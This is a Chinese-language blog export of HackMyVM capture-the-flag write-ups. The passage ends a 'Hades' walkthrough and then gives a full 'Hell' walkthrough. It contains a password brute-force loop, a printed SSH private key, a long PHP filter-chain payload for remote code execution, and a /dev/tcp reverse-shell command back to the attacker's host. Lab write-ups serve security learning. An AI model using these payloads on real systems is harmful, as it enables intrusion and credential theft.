<span class="token comment">## EN ##</span>
If we give a username <span class="token punctuation">(</span>user<span class="token punctuation">)</span> and password <span class="token punctuation">(</span>password<span class="token punctuation">)</span> at http: //localhost/request.php, user phoebe may give us her password. 

<span class="token comment">## ES ##</span>
Si damos un usuario <span class="token punctuation">(</span>user<span class="token punctuation">)</span> y password <span class="token punctuation">(</span>password<span class="token punctuation">)</span> en http://localhost/request.php puede que phoebe nos de <span class="token function">su</span> password.</code></pre>
<p>这题是真恶心，一开始不知道用户名用哪个，所以都用phoebe，密码用rockyou爆破键值大错特错<br>后来通过get传参，用已知用户名和密码可以跑出来一些结果，多出来三个新密码，但是都对不上号<br>后来看了小白师傅得到的提示，才发现最开始的hacker用户密码给疏忽，于是又跑了一下，跑出来phoebe的密码，服了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line
<span class="token keyword">do</span>
  <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">'[/: ]'</span> <span class="token string">'&#123;print $3&#125;'</span><span class="token variable">)</span></span>
  <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"http://localhost/request.php?user=<span class="token variable">$user</span>&amp;password=begood!"</span>
<span class="token keyword">done</span> <span class="token operator">&lt;</span> users.txt</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">penelope@hades:/tmp/taaa$ <span class="token function">sh</span> b.sh

NOTHING.

NOTHING.

NOTHING.

NOTHING.

NOTHING.

FPLwKmmKhcWAwRxiaBDN

NOTHING.

NOTHING.

NOTHING.
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<h2 id="MISSION-0x48"><a href="#MISSION-0x48" class="headerlink" title="MISSION 0x48"></a>MISSION 0x48</h2><pre class="language-bash" data-language="bash"><code class="language-bash">phoebe@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x48 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User rhea likes pictures.

<span class="token comment">## ES ##</span>
A la usuaria rhea le gustan las imagenes.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">phoebe@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> phoebe on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User phoebe may run the following commands on hades:
    <span class="token punctuation">(</span>rhea<span class="token punctuation">)</span> NOPASSWD: /usr/bin/convert</code></pre>
<p>是一个convert指令，convert是图像格式转化工具，群里大佬给了个思路，将txt转化成png</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">phoebe@hades:/tmp/taaa$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> rhea /usr/bin/convert TEXT:/pwned/rhea/flagz.txt /var/tmp/qazx.png
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/15/ORBdaU.png" alt="ORBdaU.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">rhea/iKVVfwEDFbBpTnlnKZKr</code></pre>
<h2 id="MISSION49"><a href="#MISSION49" class="headerlink" title="MISSION49"></a>MISSION49</h2><pre class="language-bash" data-language="bash"><code class="language-bash">rhea@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x49 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User selene wants to tell us something<span class="token punctuation">..</span>.

<span class="token comment">## ES ##</span>
La usuaria selene nos quiere decir algo<span class="token punctuation">..</span>.</code></pre>
<p>用户目录有个流量包,可以分离出来个ssh私钥，直接登录就行了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> id_rsa            
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA6m8jc3NEzQBue8NzNmhxHNVfgCmx+EumEFhq0amDaepnME4N8DWC
O/tHCAh8np089DlUDHpe/8T06muybeN02U8ULr1HJGl03q4nAcHi+tA82ES3MJaWu97BmS
qsEWxDZvYVgySjsG7bbEPE/OuYlWDXfj9QSnD4QNccrt9BmFp3HLGdDt+bbkuQZ6ElN1Qd
m9PFN9GYfM3g0/sM68jtw2XHO7KWKucaod1BOERknGxaM3FqHl+6Rpk3piQthoC+Nuqe5f
jm3rgu4sqXLAd7iFf+NBKDfTmfzwxxH/bIR/Cl1mJwHcC75IceW5OC2wtu938JflO6VFcT
58a0S+GcZwAAA8iJKHc6iSh3OgAAAAdzc2gtcnNhAAABAQDqbyNzc0TNAG57w3M2aHEc1V
+AKbH4S6YQWGrRqYNp6mcwTg3wNYI7+0cICHyenTz0OVQMel7/xPTqa7Jt43TZTxQuvUck
aXTericBweL60DzYRLcwlpa73sGZKqwRbENm9hWDJKOwbttsQ8T865iVYNd+P1BKcPhA1x
yu30GYWnccsZ0O35tuS5BnoSU3VB2b08U30Zh8zeDT+wzryO3DZcc7spYq5xqh3UE4RGSc
bFozcWoeX7pGmTemJC2GgL426p7l+ObeuC7iypcsB3uIV/40EoN9OZ/PDHEf9shH8KXWYn
AdwLvkhx5bk4LbC273fwl+U7pUVxPnxrRL4ZxnAAAAAwEAAQAAAQAVYlHfhBIwiOuLCocF
3X0D3kq5zBPZzDy3nPkRat772E/VTiljUd4xTnhqOSv04+7dcCVEhh0IQ5T7lRtPfsH32I
jEwqssnRn1/fi85kyoCDqkl5AGNJZHSMhsCkJrzG5Rg/zuW3c67sHBHGVplKv0ZEMD1w6h
27ApafXJ1b+L//fHjLbq+HVdrRTF2XmVXSgWj2NpjhdRUzfrcSNz+QgBnltzaY8YJYTsOD
jcLClwnOgCpWS+YghzQUDMr+uoIeSGNTM08q2Y+cPKUPNJ4+J/cA1vDsZiA79jxSrEdII4
BJ9GPbOHempz07SN7hy46Z5cpLuSN0xmTkbkzftSvQShAAAAgQDV42e8bUweH17x+NLduU
CrfIEJmwaJ8xaER4SizExG6R2aGyqXlefPVeZDnRtLR70y4NEPCbOVlmlk+t6n0gn3Pjxt
WdPXE5O18uwwSSjs182DcVqB6NWq2SrKLPSDVQIHNjaFVyLhHav7k2sIokAgMx9/oojNBd
qMuXTseyeyjQAAAIEA/quM6uiMpyjTKegVGt/pCeXFKwK3vKQpyY/gwrtJKMbG4tIWCnBC
ah891PHlq/hQbsrw0QIw/xpmh0YnxB8fsYbqhIh6zWXsyx0pIZUqSg7BA1Tx5ZJtWZg6VM
T2vioJQ9tTerPDUDY0b2f69odG0t+S6OP1WxyHJvyoZsLYHh8AAACBAOuoiTnUIRfPLBHA
zLp7cbH/6FG1l+TzKzBrBuUp4i3gg0Sautfh1/JMcc/zl0Pe2SxvCX0c64xEtLMIVn9/ov
hMk1sbuGbpcrY/N99/xk8NZMDXPSlROgOZ5BLdYu7xrHzWRiAZ/2S7rV4dtLK9L3FuCWjZ
SD+hjsg3DNNJISi5AAAADXNtbEBjYXNzYW5kcmEBAgMEBQ<span class="token operator">==</span>
-----END OPENSSH PRIVATE KEY-----</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">selene@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2041</span><span class="token punctuation">(</span>selene<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2041</span><span class="token punctuation">(</span>selene<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2041</span><span class="token punctuation">(</span>selene<span class="token punctuation">)</span> 
selene@hades:~$ <span class="token function">cat</span> flagz.txt
^VgZLrvZyzGYvqegkslh^</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">selene/zZqEimsDlLPqIyqzNyWB</code></pre>
<h2 id="MISSION50"><a href="#MISSION50" class="headerlink" title="MISSION50"></a>MISSION50</h2><pre class="language-bash" data-language="bash"><code class="language-bash">selene@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x50 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user maria <span class="token punctuation">..</span>. I think I have seen her password.

<span class="token comment">## ES ##</span>
La usuaria maria<span class="token punctuation">..</span>. creo haber visto <span class="token function">su</span> password.</code></pre>



















































]]></content>
      <categories>
        <category>Labs</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Hell</title>
    <url>/posts/709c1b3d/</url>
    <content><![CDATA[<p><strong>难度:hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.199</strong></p>
<h2 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h2><pre class="language-bash" data-language="bash"><code class="language-bash">When booting the machine log <span class="token keyword">in</span> with the credentials: 
run:run 

And execute the command:
<span class="token function">sudo</span> run</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORkrpc.png" alt="ORkrpc.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>                              

Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:21:f5:04       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.199  08:00:27:07:06:4d       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop                                                                                                                                                                  root@kali2  06:54:31 
<span class="token operator">></span> nmap <span class="token number">192.168</span>.56.199
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 06:54 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.199
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00023s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:07:06:4D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.15</span> seconds

 ~/Desktop                                                                                                                                                                  root@kali2  06:54:42 
<span class="token operator">></span> nmap <span class="token number">192.168</span>.56.199 -p21,22,80 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-17 06:54 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.199
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00018s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.5
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.56.104
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">1</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.5 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">256</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">84</span>:9f:33:ed:c5:e2:11:ff:20:7d:0e:d5:31:1a:f0:08 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> b8:bc:0e:e3:84:af:21:ee:fb:cc:93:41:7d:9b:54:75 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.52
<span class="token operator">|</span> http-auth: 
<span class="token operator">|</span> HTTP/1.1 <span class="token number">401</span> Unauthorized<span class="token punctuation">\</span>x0D
<span class="token operator">|</span>_  Basic <span class="token assign-left variable">realm</span><span class="token operator">=</span>Restricted Content
<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: <span class="token number">401</span> Unauthorized
MAC Address: 08:00:27:07:06:4D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host: <span class="token number">172.17</span>.0.2<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre>
<h2 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ftp</span> <span class="token number">192.168</span>.56.199
Connected to <span class="token number">192.168</span>.56.199.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.5<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.199:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">29460</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">115</span>          <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">115</span>          <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>              <span class="token number">34</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .passwd
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">256</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get .passwd
local: .passwd remote: .passwd
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">36827</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> .passwd <span class="token punctuation">(</span><span class="token number">34</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***************************************************************************************************************<span class="token operator">|</span>    <span class="token number">34</span>       <span class="token number">96.80</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">34</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">54.43</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get flag.txt
local: flag.txt remote: flag.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">38750</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> flag.txt <span class="token punctuation">(</span><span class="token number">256</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***************************************************************************************************************<span class="token operator">|</span>   <span class="token number">256</span>       <span class="token number">13.56</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">256</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">111.35</span> KiB/s<span class="token punctuation">)</span></code></pre>
<p>拿到flag1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> flag.txt                                                                                  

▄▀█ █▄ █ █▀█ █▄ █ █▄█ █▀▄▀█ █▀█ █ █ █▀
█▀█ █ ▀█ █▄█ █ ▀█  █  █ ▀ █ █▄█ █▄█ ▄█

Flag <span class="token number">1</span>: HELL<span class="token punctuation">&#123;</span>4N0NYM0U5_15_7H3_B357_U53R<span class="token punctuation">&#125;</span></code></pre>
<p>还给了一个密码<code>webserver2023!</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> .passwd   

The password is: webserver2023<span class="token operator">!</span></code></pre>
<h2 id="Authorization爆破"><a href="#Authorization爆破" class="headerlink" title="Authorization爆破"></a>Authorization爆破</h2><p><img src="https://ooo.0x0.ooo/2024/07/17/ORkZBM.png" alt="ORkZBM.png" loading="lazy"><br>需要Authorization认证，尝试爆破一手，正好用给的密码爆破用户名<br><img src="https://ooo.0x0.ooo/2024/07/17/ORky01.png" alt="ORky01.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/07/17/ORkgwI.png" alt="ORkgwI.png" loading="lazy"><br><code>beilul:webserver2023!</code><br>登录<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkp1D.png" alt="ORkp1D.png" loading="lazy"><br>拿到flag2 <code>Flag 2: HELL&#123;BRUT3_F0RC3_M4Y_B3_4N_0P710N&#125;</code></p>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p><img src="https://ooo.0x0.ooo/2024/07/17/ORkJHF.png" alt="ORkJHF.png" loading="lazy"><br>主要到url可能存在任意文件读取<code>http://192.168.56.199/index.php?profile=eddiedota.html</code><br>直接读会被ban<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkP86.png" alt="ORkP86.png" loading="lazy"><br>尝试一下发现为伪协议可以读<br><img src="https://ooo.0x0.ooo/2024/07/17/ORktxP.png" alt="ORktxP.png" loading="lazy"><br>这下不得不尝试filterRce了<br>php:&#x2F;&#x2F;filter&#x2F;convert.%2569conv.UTF8.CSISO2022KR|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM921.NAPLPS|convert.%2569conv.855.CP936|convert.%2569conv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.IBM869.UTF16|convert.%2569conv.L3.CSISO90|convert.%2569conv.UCS2.UTF-8|convert.%2569conv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.8859_3.UTF16|convert.%2569conv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.865.UTF16|convert.%2569conv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.UTF16LE|convert.%2569conv.UTF8.CSISO2022KR|convert.%2569conv.UCS2.UTF8|convert.%2569conv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CSIBM1161.UNICODE|convert.%2569conv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.ISO2022KR.UTF16|convert.%2569conv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.base64-decode&#x2F;resource&#x3D;php:&#x2F;&#x2F;temp&amp;0&#x3D;whoami<br><img src="https://ooo.0x0.ooo/2024/07/17/ORk4Jb.png" alt="ORk4Jb.png" loading="lazy"><br>确实rce了,反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">0</span><span class="token operator">=</span>bash%20-c%20<span class="token string">'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261'</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                   
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.199<span class="token punctuation">]</span> <span class="token number">47950</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@d45eb9e78ad8:/var/www/html$ </code></pre>
<p>拿到flag3</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@d45eb9e78ad8:/var/www/html$ <span class="token function">cat</span> flag.txt 
<span class="token function">cat</span> flag.txt

█   █▀▀ █ ▀█ █▀█ █▀▀ █▀▀
█▄▄ █▀  █ █▄ █▀▄ █▄▄ ██▄

Flag <span class="token number">3</span>: HELL<span class="token punctuation">&#123;</span>LF1_F1LT7R_CH41N_G3N3R4T0R<span class="token punctuation">&#125;</span></code></pre>
<p>搜索一番，but nothing，home下也没有其他用户，尝试切换root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@d45eb9e78ad8:/var/www/html$ <span class="token function">su</span> root
<span class="token function">su</span> root
Password: webserver2023<span class="token operator">!</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>给个交互shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
root@d45eb9e78ad8:/var/www/html<span class="token comment"># </span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@d45eb9e78ad8:~<span class="token comment"># ls -al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwx------ <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Jul <span class="token number">17</span> 00:53 <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> root root    <span class="token number">5</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">3106</span> Oct <span class="token number">15</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> .local
